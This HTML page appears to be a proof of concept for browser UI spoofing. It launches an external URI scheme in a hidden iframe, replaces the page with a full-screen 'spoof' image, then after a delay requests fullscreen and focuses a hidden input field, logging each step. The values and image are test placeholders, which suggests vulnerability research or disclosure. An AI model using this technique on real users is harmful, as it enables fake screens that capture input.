<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
    />
    <title>tester-diag-fs-delay</title>
    <style>
      html,
      body {
        margin: 0;
        padding: 0;
        width: 100%;
        height: 100%;
        overflow: hidden;
        overscroll-behavior: none;
        touch-action: none;
        background: #fff;
        text-align: center;
        font-family: sans-serif;
      }
      #spoof {
        display: none;
        position: fixed;
        inset: 0;
        width: 100%;
        height: 100%;
        object-fit: cover;
        transform: translateZ(0);
        backface-visibility: hidden;
        user-select: none;
        -webkit-user-select: none;
        pointer-events: none;
      }
      #bait {
        position: fixed;
        inset: 0;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        gap: 12px;
      }
      #overlay {
        display: none;
        position: fixed;
        inset: 0;
        background: rgba(0, 0, 0, 0.35);
        align-items: center;
        justify-content: center;
        z-index: 10;
      }
      #overlay.show {
        display: flex;
      }
      #overlayInput {
        padding: 10px 14px;
        font-size: 16px;
        border: 2px solid #222;
        background: #fff;
      }
      select,
      button {
        padding: 12px 20px;
        font-size: 16px;
        cursor: pointer;
        touch-action: manipulation;
      }
    </style>
  </head>
  <body>
    <img id="spoof" src="spoof.png" alt="spoof" decoding="sync" />

    <div id="bait">
      <h2>Scheme &amp; Delayed Fullscreen Diag</h2>
      <label for="schemeSelect">Target URI Scheme:</label>
      <select id="schemeSelect">
        <option value="geo:0,0?q=test">geo: (geo:0,0?q=test)</option>
        <option value="tel:000000">tel: (tel:000000)</option>
        <option value="mailto:test@example.invalid">mailto: (mailto:test@example.invalid)</option>
        <option value="sms:000000">sms: (sms:000000)</option>
      </select>
      <button id="btn">run test</button>
    </div>

    <div id="overlay" aria-hidden="true">
      <input id="overlayInput" type="text" placeholder="diag focus target" />
    </div>

    <script>
      const docEl = document.documentElement;
      const reqFS =
        docEl.requestFullscreen ||
        docEl.webkitRequestFullscreen ||
        docEl.mozRequestFullScreen ||
        docEl.msRequestFullscreen;

      const btn = document.getElementById("btn");
      const schemeSelect = document.getElementById("schemeSelect");
      const bait = document.getElementById("bait");
      const spoof = document.getElementById("spoof");
      const overlay = document.getElementById("overlay");
      const overlayInput = document.getElementById("overlayInput");

      const logEvent = (label, extra = "") => {
        const ts = performance.now().toFixed(2);
        const active = navigator.userActivation?.isActive ?? "n/a";
        console.info(`[PoC +${ts}ms | act=${active}] ${label}`, extra);
      };

      spoof.addEventListener("load", () => {
        logEvent("spoof image loaded", `${spoof.naturalWidth}x${spoof.naturalHeight}`);
      });

      spoof.addEventListener("error", () => {
        logEvent("spoof image failed to load");
      });

      document.addEventListener("fullscreenchange", () => {
        logEvent("fullscreenchange", `activeElement=${document.fullscreenElement?.id || "none"}`);
      });

      document.addEventListener("fullscreenerror", (err) => {
        logEvent("fullscreenerror", err?.type || "unknown");
      });

      document.addEventListener("visibilitychange", () => {
        logEvent("visibilitychange", `visibilityState=${document.visibilityState}`);
      });

      window.addEventListener("blur", () => {
        logEvent("window blur");
      });

      window.addEventListener("focus", () => {
        logEvent("window focus");
      });

      btn.addEventListener("click", () => {
        const chosenUri = schemeSelect.value;
        logEvent("click received", `uri=${chosenUri}`);

        const frame = document.createElement("iframe");
        frame.style.display = "none";
        frame.src = chosenUri;
        document.body.appendChild(frame);
        logEvent("scheme iframe appended", chosenUri);

        bait.style.display = "none";
        spoof.style.display = "block";
        logEvent("dom visibility toggled");

        setTimeout(() => {
          logEvent("timeout 300ms fired");

          if (typeof reqFS === "function") {
            const result = reqFS.call(docEl);
            if (result && typeof result.catch === "function") {
              result
                .then(() => logEvent("requestFullscreen resolved"))
                .catch((err) =>
                  logEvent("requestFullscreen rejected", err?.message || String(err))
                );
            } else {
              logEvent("requestFullscreen invoked (non-promise)");
            }
          } else {
            logEvent("requestFullscreen unsupported");
          }

          overlay.classList.add("show");
          overlayInput.focus();
          logEvent("overlay shown & input focused", `active=${document.activeElement?.id || "none"}`);
        }, 300);
      });
    </script>
  </body>
</html>
